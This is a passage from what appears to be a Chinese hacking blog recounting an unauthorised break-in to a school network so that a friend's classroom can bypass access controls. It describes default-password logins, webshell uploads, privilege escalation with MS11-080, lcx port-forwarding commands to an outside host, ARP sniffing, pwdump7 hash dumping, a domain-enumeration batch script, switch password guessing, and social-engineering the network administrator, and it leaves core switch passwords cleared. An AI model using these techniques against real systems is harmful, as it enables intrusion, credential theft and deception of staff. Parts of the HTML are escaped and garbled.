<p>这样，然后再浏览器里回车一下，然后上传直接改名字为miao.asp，经过多方测试，貌似改名字了，但是都是显示404，开始以为杀软非常强大，把我的所以免杀马儿都干掉了，然后改下构造页面uploadpic.asp?actiontype=mod&amp;picname=miao.txt ，上传后得到的名字是miao.txt，这个应该不是被杀了吧！上传后发现还是404，就觉得不对劲了，可能是上传坏了或者目录不能写了！换过其他地方来X吧。他是很多这些二三级目录的系统，都是同一种，都是去除了权限。于是就转战了招聘站。</p>  <p>0x03</p>  <p>希望被破灭！</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image030.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image030" border="0" alt="clip_image030" src="http://img.cker.in/df99b5f14772_C386/clip_image030_thumb.jpg" width="573" height="347"></a></p>  <p>一般来说招聘网是分为企业者和招聘者。一般都有上传头像或者企业图片的地方，我很开心，说不定能直接getshell，但是当我注册了账号进去后，貌似不好突破呢，上传都是非常严格，在经过明小子和bs改包上传都不行，这个站貌似是万企捐献的，简单来说是万企建的站，之前不是说万企有个通杀的漏洞吗，发现这里是没有的，经过一番围观，貌似看见就业论坛的字眼耶<a href="http://img.cker.in/df99b5f14772_C386/clip_image032.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image032" border="0" alt="clip_image032" src="http://img.cker.in/df99b5f14772_C386/clip_image032_thumb.jpg" width="78" height="61"></a>，一看是dvbbs8.3的搭建的论坛，有sql注入，不过还是先测试下默认账号密码，admin，admin888，bingo，正在登陆<a href="http://img.cker.in/df99b5f14772_C386/clip_image034.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image034" border="0" alt="clip_image034" src="http://img.cker.in/df99b5f14772_C386/clip_image034_thumb.jpg" width="389" height="46"></a>这个也下了，虽然有几个管理，因为留着社工管理，还是留着用。在后台拿shell 添加php就行了，在论坛上传的时候貌似404，要不被杀了，要不不可写，但是上传图片时候能显示，还有就是网上说的添加ashx，但是我是没成功过的，可能我比较倒霉<code>``。当然本地搭建的起码成功了，我爱本地搭建的，但是不是他论坛上的shell··· 好吧，来添加看看，上传成功，根据代码，在根目录生成一个一句话后门，名为XX.asp，但是访问都是404，你妹的添加，又是没成功，我爱他，但是他还是不爱我的。现在基本失去希望了，只有返回招聘网主目录看看吧，测试着搜寻型注入等注入地方，貌似都是过滤了，看到下载中心，会不会有下载漏洞呢？！下载文件，还有登录的用户啊，真麻烦！&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image036.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image036&quot; border=&quot;0&quot; alt=&quot;clip_image036&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image036_thumb.jpg&quot; width=&quot;574&quot; height=&quot;511&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;看到什么了吗！？我相信聪明的朋友已经看出什么了，至于他有没有做好防范呢？！这不得而知，需要实践下才能确认，&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image038.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image038&quot; border=&quot;0&quot; alt=&quot;clip_image038&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image038_thumb.jpg&quot; width=&quot;242&quot; height=&quot;70&quot; /&gt;&lt;/a&gt;貌似没有过滤耶，这时心情才好了点，根据信息，进入了后台，进去没多久就出来了- -· 居然里面非常严格，什么利用信息也没找到！&lt;/p&gt;  &lt;p&gt;0x04&lt;/p&gt;  &lt;p&gt;一线希望！&lt;/p&gt;  &lt;p&gt;经过十多分钟在教师登录系统的猜测，一个也没登上，起码我蛋疼了，于是我看到了&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image040.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image040&quot; border=&quot;0&quot; alt=&quot;clip_image040&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image040_thumb.jpg&quot; width=&quot;573&quot; height=&quot;348&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;看见开发公司了吧！至于你看不看得见，反正我看见了！于是萌发了两个方案，其中一个是社工方案，一个源码分析，于是在搜索引擎的帮助下，终于失败告终，这套系统是由此公司开发，需要1k多来购买，网上还没找到开放的源码，我晕，我再晕，我一直晕！好吧，由于第二方案比较YD，所以暂时不会用，不过说下简单思路，有个工具是伪造邮件的吧！我们可以根据伪造发给管理员，说系统升级，需要怎么怎么，你懂的！&lt;/p&gt;  &lt;p&gt;于是先聊会天，等下整理完再来！扯扯淡，聊聊妹纸！&lt;/p&gt;  &lt;p&gt;好了，继续工作吧！&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image042.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image042&quot; border=&quot;0&quot; alt=&quot;clip_image042&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image042_thumb.jpg&quot; width=&quot;574&quot; height=&quot;275&quot; /&gt;&lt;/a&gt;突然在google里翻呀翻，居然在主站里找到了一个XX级目录上的站，非常好！是dedecms，我们看最近爆出许许多多漏洞，我们来YYDD吧，上了杀器，貌似都返回原点了，测试那个xss的，注册用户，填好XSS getshell的信息，发送，等待管理员来认领，一天过去了，没事发生，貌似还没审核啊，于是直接加管理QQ，直接叫他来审核！过了一会上站里看看，貌似没有事情发生啊，文章虽然审核了！直接找后台，利用收集了的信息进行社工！&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://www.xxx.com/XXX/XXX/XXX/dede&quot;&gt;http://www.XXX.com/XXX/XXX/XXX/dede&lt;/a&gt; 貌似没有信息返回啊，怎么404，NND，继续来射吧射吧&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image044.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image044&quot; border=&quot;0&quot; alt=&quot;clip_image044&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image044_thumb.jpg&quot; width=&quot;518&quot; height=&quot;346&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;好吧好吧，好YD的后台，但是还是阻止不了我们前进的脚步，这次没有走远，没有默认的密码，根据手头信息，一个密码一个密码地测试吧，貌似不行，继续构造，最终以“admin XXX”进入后台，后台拿shell，直接写，没有过滤，也不做解释了！在菜刀里看，我擦，居然主站没后台！你妹啊！&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image046.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image046&quot; border=&quot;0&quot; alt=&quot;clip_image046&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image046_thumb.jpg&quot; width=&quot;573&quot; height=&quot;290&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;到webshell里看，全盘权限，ws支持，支持aspx，php，3389开着！然后就是看补丁情况，最后能直接上去一步搞到，先来一套提权方案吧！&lt;/p&gt;  &lt;p&gt;Ws支持，试试提权exp&lt;/p&gt;  &lt;p&gt;Mysql root权限，udf提权&lt;/p&gt;  &lt;p&gt;sa权限，直接KO&lt;/p&gt;  &lt;p&gt;第三方暂时没其他了。&lt;/p&gt;  &lt;p&gt;开始在c盘放上工具，但是一直运行不了，开始以为权限问题，经过一番验证确实是，后来转到e盘，马上搞定了！udf当时测试是被删，服务器是瑞星的，没免杀，sa被降权了！最后以ms011-80搞定&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image048.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image048&quot; border=&quot;0&quot; alt=&quot;clip_image048&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image048_thumb.jpg&quot; width=&quot;239&quot; height=&quot;227&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;然后就不连上去了，之前lcx直接反弹搞定！其他的提权都免了，好快啊！&lt;/p&gt;  &lt;p&gt;0x05&lt;/p&gt;  &lt;p&gt;嗅探之，结束也！&lt;/p&gt;  &lt;p&gt;上去就想马上搞下那个什么系统来，于是嗅探了一回，彻底失望，什么也没有，上班时间，应该会流动很快才对啊，于是我就把发包率调大，还是一样，我不爱他了，cain你妹的！于是根据经验，应该安装了arp防火墙，很简单，直接不停地给网关发就行了。直接down幻境网盾，这个很好用，你基友我一直在用，我也给我的基友们一起用，我推荐大家一起用（这个貌似是成龙拍霸王的广告···），不到一回，马上来了，是吧！很好用，直接抄个账号直接登录，发现只是发邮件的功能和浏览一些管理的公告，一直没嗅探到管理账号，所以在上面找啊找，看下利用的地方，一想，发邮件应该会有上传附件的地方吧，好吧，我YD的手按了发邮件，果断有，虽然限制了 2M，但是我的几十K就够了，没过滤，完成任务，但是还是ms011-80搞定，因为方便么！直接在嗅探的机器里连接，不知道为啥手YD了，按了5下shiift，居然弹cmd窗口了，上去直接把后门删除，完毕。&lt;/p&gt;  &lt;p&gt;0x06&lt;/p&gt;  &lt;p&gt;最终目的。&lt;/p&gt;  &lt;p&gt;好了，现在开始对内网进行X了，当然这也是最终的目的，内网非常大，分为二层三层交换机，经过收集很多网段，当然我的最终目的不是将他的内网全部挂马，而是拿到路由权限，然后完成对某位朋友的约定！&lt;/p&gt;  &lt;p&gt;因为我的机器不是外网，也省得反弹，所以直接骑上肉鸡！主机上用lcx反弹，当然如果你觉得其他好用可以尝试下其他反弹工具，我只是随手拿起来能用就行了，在主机运行上：lcx –listen 51 2008 。webshell上运行： lcx.exe -slave XXX.XXX.XXX.XXX 51 192.168.8.210 3389 ，然后在主机打开远程 输入：127.0.0.1:2008 。有数据回显，表示反弹成功，&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image050.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image050&quot; border=&quot;0&quot; alt=&quot;clip_image050&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image050_thumb.jpg&quot; width=&quot;521&quot; height=&quot;385&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;好了，连上后，我并不会去理他的配置，这个留在最后看也不会迟，首先，我会大致理解下他的拓扑结构，因为我参观过网管室，所以大概知道下情况！反正他就是至少会在三层交换机之中。&lt;/p&gt;  &lt;p&gt;核心交换机--------三层--------二层--------路由等&lt;/p&gt;  &lt;p&gt;现在我的目的是搞定交换机，让教室能正常上网就行了。&lt;/p&gt;  &lt;p&gt;三个域，收集情况我会用批处理去完成这项工作&lt;/p&gt;  &lt;p&gt;@echo off&lt;/p&gt;  &lt;p&gt;setlocal ENABLEDELAYEDEXPANSION&lt;/p&gt;  &lt;p&gt;@FOR /F &amp;quot;usebackq delims=, &amp;quot; %%J IN (`net view /domain ^|find &amp;quot;命令執行成功&amp;quot; /v ^|find &amp;quot;The command completed successfully.&amp;quot; /v ^|find &amp;quot;命令成功完成&amp;quot; /v ^|find &amp;quot;--&amp;quot; /v ^|find &amp;quot;Domain&amp;quot; /v ^|find &amp;quot;&amp;quot; /v ^|find &amp;quot;コマンドは正常に終了しました&amp;quot; /v /i`) do (&lt;/p&gt;  &lt;p&gt;@echo =====domain:%%J========&lt;/p&gt;  &lt;p&gt;@FOR /F &amp;quot;usebackq eol=; delims=, &amp;quot; %%i in (`net view /domain:%%J ^|findstr &amp;quot;\\&amp;quot;`) DO (&lt;/p&gt;  &lt;p&gt;@FOR /F &amp;quot;usebackq eol=; tokens=1,2,3* delims=\\&amp;quot; %%a in (`echo %%i`) do (&lt;/p&gt;  &lt;p&gt;@FOR /F &amp;quot;tokens=1,2,3,4* usebackq delims=: &amp;quot; %%K IN (`@ping -a -n 1 -w 100 %%a ^|findstr &amp;quot;Pinging&amp;quot;`) do (&lt;/p&gt;  &lt;p&gt;@echo \\%%L %%M&lt;/p&gt;  &lt;p&gt;)&lt;/p&gt;  &lt;p&gt;)&lt;/p&gt;  &lt;p&gt;)&lt;/p&gt;  &lt;p&gt;)&lt;/p&gt;  &lt;p&gt;echo %0&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image052.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image052&quot; border=&quot;0&quot; alt=&quot;clip_image052&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image052_thumb.jpg&quot; width=&quot;168&quot; height=&quot;95&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;好了，收集差不多就动工，首先这台服务器是从80端口突破的，当然还有另一台。测试下ping其他段的机器，因为是寒假期间，所以我会选择ping交换机，经过朋友的收集情况，每天早上 6:50 到 中午 11:50 会开启&lt;/p&gt;  &lt;p&gt;下午14:15 到 下午 16:55 会开启&lt;/p&gt;  &lt;p&gt;晚上 18:10 到 晚上 21:30 会开启&lt;/p&gt;  &lt;p&gt;好了,大致也了解到 交换机的启动时间 资料, 首先不知道本机出于哪个网段,是不是最高毫无妨碍呢?! 非常好, 因为当时我参观的时候 网管就是坐在 这台服务器上工作的, 朋友说平时老师上课时候要用到连接外网工作,都是由这台服务器去操作的, 所以简单来说这台是能ping通整个校园网络的! 我的现正处于的网段就是：192.168.8.1-255。 如图, 我以我朋友的教室为案例,以及隔壁班的一起：&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image054.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image054&quot; border=&quot;0&quot; alt=&quot;clip_image054&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image054_thumb.jpg&quot; width=&quot;574&quot; height=&quot;220&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image056.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image056&quot; border=&quot;0&quot; alt=&quot;clip_image056&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image056_thumb.jpg&quot; width=&quot;504&quot; height=&quot;404&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;好了，测试通过，证明这是对的，他的机器是装有瑞星套装，如果到处都ping不通，尝试下关掉防火墙。&lt;/p&gt;  &lt;p&gt;当然，我们现在的目的是取得交互机的权限，使得教室网络解除acl限制&lt;/p&gt;  &lt;p&gt;首先收集下本段的机器有哪些是存活的，当时我在嗅探，所以直接在cain下就能看到！&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image058.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image058&quot; border=&quot;0&quot; alt=&quot;clip_image058&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image058_thumb.jpg&quot; width=&quot;281&quot; height=&quot;108&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;而且之前我cain的时候不只这些机器，还有其他几台&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image060.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image060&quot; border=&quot;0&quot; alt=&quot;clip_image060&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image060_thumb.jpg&quot; width=&quot;195&quot; height=&quot;160&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;可能处于某些原因，寒假关闭了。经过一番&lt;a href=&quot;http://ha.cker.in/tag/嗅探&quot; target=&quot;_blank&quot;&gt;嗅探&lt;/a&gt;，我获得了同网段下的 192.168.8.252 这台服务器，这台是对外开放，所以成功搞下了！ 有些人问，我的目的只是想弄到交换机的权限，为啥还有搞这么多工作呢？！ 我告诉你，知己知彼才能百战百胜，因为出于交换机要使用特权模式，而且我暂时没有射到密码，所以必须弄多几台机器，导出系统的hash，再凑合几个密码来。&lt;/p&gt;  &lt;p&gt;好了，我们来登录另一台机器看下有啥遗留下来的有用的信息！因为这台就是内网，不用再用肉鸡反弹了！手贱的情况下，还是按了5下shift ，弹出 窗口， 不解释了， 是之前的X者遗留下来的后门，当时已经添加了用户，别理了。到时候直接删除就行了！&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image062.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image062&quot; border=&quot;0&quot; alt=&quot;clip_image062&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image062_thumb.jpg&quot; width=&quot;574&quot; height=&quot;399&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;提权也很简单，拿shell也很简单，不多说了！&lt;/p&gt;  &lt;p&gt;上传wce时候，发现不能使用，导出注册表的时候用cain也不能，于是搜索了下还有什么神器能用， pwdump7 ，这个使用非常简单，pwdump7.exe 1&amp;gt;1.txt 意思是把全部hash导出到文件根目录的1.txt 里面， 然后直接到站里破就可以了，如果有彩虹表的直接跑咯，一台跑出了&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image064.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image064&quot; border=&quot;0&quot; alt=&quot;clip_image064&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image064_thumb.jpg&quot; width=&quot;482&quot; height=&quot;42&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;另一台跑出的是 &lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image066.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image066&quot; border=&quot;0&quot; alt=&quot;clip_image066&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image066_thumb.jpg&quot; width=&quot;509&quot; height=&quot;50&quot; /&gt;&lt;/a&gt; administrator为不知道，导出有问题。那些账号密码一样的是我自己的号。然后开些轻型级的武器，扫描整个段，为啥不扫其他段呢？！ 1、这个段服务器段 2、其他段的机器也关了。好吧，配置下htscan 直接扫了。暂时未发现弱机器。好了，我们下一步，社工存活的服务器。 各种密码，各种配合 一起来搞……..几分钟过去射不出，可能那些服务器不是由同一个网管打理的吧。不理了，如果有需要的话我会直接利用漏洞导致整个校园来种马。Arp你们都会的。 telnet 192.168.27.1 这个是我朋友的教室网关，也就是交换机了。&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image068.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image068&quot; border=&quot;0&quot; alt=&quot;clip_image068&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image068_thumb.jpg&quot; width=&quot;310&quot; height=&quot;182&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;成功。进行输入账号密码阶段。一般来说我们习惯性都是由简单到复杂来猜测的！&lt;/p&gt;  &lt;p&gt;Admin admin 你们懂得！&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image070.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image070&quot; border=&quot;0&quot; alt=&quot;clip_image070&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image070_thumb.jpg&quot; width=&quot;316&quot; height=&quot;175&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;这是交换机的用户模式。现在我们要想办法进入特权模式，以备开启教室网络的重要操作。&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image072.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image072&quot; border=&quot;0&quot; alt=&quot;clip_image072&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image072_thumb.jpg&quot; width=&quot;108&quot; height=&quot;152&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;尝试完这一批之后，失败了，重新组合密码吧，孩纸，我想也没那么简单就让你这垃圾通过的！经过差不多30分钟的猜测，进去了！我的神。只有目的达到，为求不咋手段、&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image074.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image074&quot; border=&quot;0&quot; alt=&quot;clip_image074&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image074_thumb.jpg&quot; width=&quot;249&quot; height=&quot;214&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;之后的什么全局配置模式 都是浮云了。目的达到。之后测试了其他的路由器都是统一密码。这个两层验证什么的都是傻逼，第一层都是默认，进而获得第二层密码，然而进入特权模式，之后的什么命令都能执行了，重新划分vlan等都可以实现，如果不懂交换机的朋友可以自己找资料看下！突然我发现貌似这只是二层交换机，还有三层和核心交换机，怎么怎么，现在才想到还有这些，因为大半夜，突然那个网管回话了··我擦，神马人啊，于是我就找到朋友，连夜叫醒他收集资料以及拿着手上的裤做对比，于是足足跟那个管理聊了1个半小时多，终于搞定了！看过程：&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image076.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image076&quot; border=&quot;0&quot; alt=&quot;clip_image076&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image076_thumb.jpg&quot; width=&quot;303&quot; height=&quot;221&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image077.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image077&quot; border=&quot;0&quot; alt=&quot;clip_image077&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image077_thumb.jpg&quot; width=&quot;286&quot; height=&quot;106&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;主要是利用你手头的信息，跟他一直聊天，小心露出破绽，关注他有关工作的信息，他说辞工了，好了，然后我就说我要了解几个交换机的信息，然后诱发他的欲望，而且你要装得很想学习，然后他就来了&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image079.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image079&quot; border=&quot;0&quot; alt=&quot;clip_image079&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image079_thumb.jpg&quot; width=&quot;200&quot; height=&quot;210&quot; /&gt;&lt;/a&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image080.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image080&quot; border=&quot;0&quot; alt=&quot;clip_image080&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image080_thumb.jpg&quot; width=&quot;266&quot; height=&quot;161&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;然后就慢慢诱惑他，逼使他说出交换机什么牌子，有助于了解配置命令，然后就是机会来了！看上图，他啥都告诉我了！&lt;/p&gt;  &lt;p&gt;0x07&lt;/p&gt;  &lt;p&gt;折腾后的社工&lt;/p&gt;  &lt;p&gt;继上次折腾后，不小心清除了核心交换机的特权密码，因为急着设置回去，又不小心清除了telnet后的账号密码，然后去了下WC就忘记加上密码就退出了。因为新的学期，根据社工前网管，得知他不干了，然后又来了个新网管，貌似他对于交换机的实操都是一知半解的，OH YEAH！ 然后就重新社工过吧。&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image082.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image082&quot; border=&quot;0&quot; alt=&quot;clip_image082&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image082_thumb.jpg&quot; width=&quot;573&quot; height=&quot;414&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;在搜索引擎中，我并没有找到什么可用的资料，就只有常用账号了，只找到两个站上有他的资料，一个是贴吧，一个是什么关于QQ的论坛。没裤。然后只能加上好友，跟他聊天了，起码我知道他是那间学校毕业的，有他们学校的学生资料就行了，他的母校也正是贵校，好了，未必用裤才能完成社工，本段正是没裤的社工了。我知他技术不太行，所以为社工带来了很多方便。&lt;/p&gt;  &lt;p&gt;因为上次我清楚了核心交换机的密码，所以导致密码为空，不能远程登录，让我觉得我手真的好贱，正好我也借此机会跟他扯上了关系。平时不懂的，直接让他问我，我找到了饭客的思科路由教程给他看，他就慢慢信任我了，当时因为他telnet不上，所以我就教他怎么修复，说修复了，让他告诉我过程，他就写了。他是装成某班的一名学生，当时说我教他修复了，让他告诉我核心交换机密码，然后让我上去耍的，他妹的，居然出尔反尔，当时气死了&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image084.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image084&quot; border=&quot;0&quot; alt=&quot;clip_image084&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image084_thumb.jpg&quot; width=&quot;228&quot; height=&quot;340&quot; /&gt;&lt;/a&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image086.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image086&quot; border=&quot;0&quot; alt=&quot;clip_image086&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image086_thumb.jpg&quot; width=&quot;302&quot; height=&quot;311&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image088.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image088&quot; border=&quot;0&quot; alt=&quot;clip_image088&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image088_thumb.jpg&quot; width=&quot;329&quot; height=&quot;202&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;然后我就冷静了下，因为社工还只是刚刚开始，我大概也能猜到，没理由这么顺心的了，但是前几天确实是这个密码，因为当时没时间，就闪人了。&lt;/p&gt;  &lt;p&gt;之后我想办法继续射他，怎么不嗅探呢？！ 以为服务器在 xxx.xxx.8.xxx 网段，他的在其他网段，而且我也不知道他PC的段，他说过只会在机房做实验，所以放下了嗅探这个办法。然后呢，他那煞笔，居然不知道自己是内外网</code>内网就让他登录我的肉鸡,然后转发登录内网,外网就直接发工具,让他本地转发,目的还是一样。其实我想他登录学校的服务器,他用administrator 登录,我用自己的账号登录,然后本地嗅探,突然发觉我好贱啊,看下图</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image090.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image090" border="0" 